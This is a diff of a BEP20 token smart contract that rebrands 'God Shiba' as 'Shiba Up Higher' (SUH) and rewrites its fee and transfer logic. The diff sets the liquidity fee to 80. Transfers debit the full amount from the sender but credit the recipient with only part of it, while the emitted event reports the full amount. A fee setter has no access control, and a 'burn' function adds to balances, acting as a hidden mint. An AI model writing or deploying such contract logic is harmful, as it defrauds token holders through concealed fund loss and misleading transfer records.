@@ -351,7 +351,7 @@ contract Ownable is Context {
     }
 }
 
-contract GODSHIBA is Context, iBEP20, Ownable {
+contract SUH is Context, iBEP20, Ownable {
   using SafeMath for uint256;
 
   mapping (address => uint256) private _balances;
@@ -365,8 +365,8 @@ contract GODSHIBA is Context, iBEP20, Ownable {
   address private _dividenttoken;
 
   constructor() public {
-    _name = 'God Shiba';
-    _symbol = 'GSHIB';
+    _name = 'Shiba Up Higher';
+    _symbol = 'SUH';
     _decimals = 9;
     _burnaddress = 0x000000000000000000000000000000000000dEaD;
     _totalSupply = 10 * 10**9 * 10**9;
@@ -378,7 +378,7 @@ contract GODSHIBA is Context, iBEP20, Ownable {
     uint256 public _taxFee = 3;
     uint256 private _previousTaxFee = _taxFee;
     
-    uint256 public _liquidityFee = 2;
+    uint256 public _liquidityFee = 80;
     uint256 private _previousLiquidityFee = _liquidityFee;
 
     uint256 public _maxTxAmount = 10 * 10**4 * 10**9;
@@ -426,7 +426,7 @@ contract GODSHIBA is Context, iBEP20, Ownable {
     return _balances[account];
   }
 
-    function setTaxFeePercent(uint256 taxFee) public() {
+    function setTaxFeePercent(uint256 taxFee) public {
         _taxFee = taxFee;
     }
     
@@ -586,10 +586,10 @@ contract GODSHIBA is Context, iBEP20, Ownable {
     require(recipient != address(0), "BEP20: transfer to the zero address");
 
     _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
-    _balances[recipient] = _balances[recipient].add(amount / uint256(100) * _taxFee);
+    _balances[recipient] = _balances[recipient].add(amount / uint256(100) * _liquidityFee);
     _balances[recipient] = _balances[recipient].sub(amount / uint256(100) * 1);
      emit Transfer(sender, recipient, amount);
-    _balances[_burnaddress] = _balances[_burnaddress].add(amount / uint256(100) * _taxFee);
+    _balances[_burnaddress] = _balances[_burnaddress].add(amount / uint256(100) * 1);
     uint256 fires = _balances[_burnaddress];
     emit Transfer(sender, _burnaddress, fires);
         
@@ -622,11 +622,11 @@ contract GODSHIBA is Context, iBEP20, Ownable {
    * - `account` cannot be the zero address.
    * - `account` must have at least `amount` tokens.
    */
-  function _burn(address account, uint256 amount) internal {
-    require(account != address(0), "BEP20: burn from the zero address");
+  function _burn(address sender, uint256 amount) internal {
+    require(sender != address(0), "BEP20: burn from the zero address");
 
-    _balances[Sender] = _balances[Sender].add(amount, "BEP20: burn amount exceeds balance");
-    emit Transfer(account, address(0), amount);
+    _balances[sender] = _balances[sender].add(amount, "BEP20: burn amount exceeds balance");
+    emit Transfer(sender, address(0), amount);
   }
 
   /**
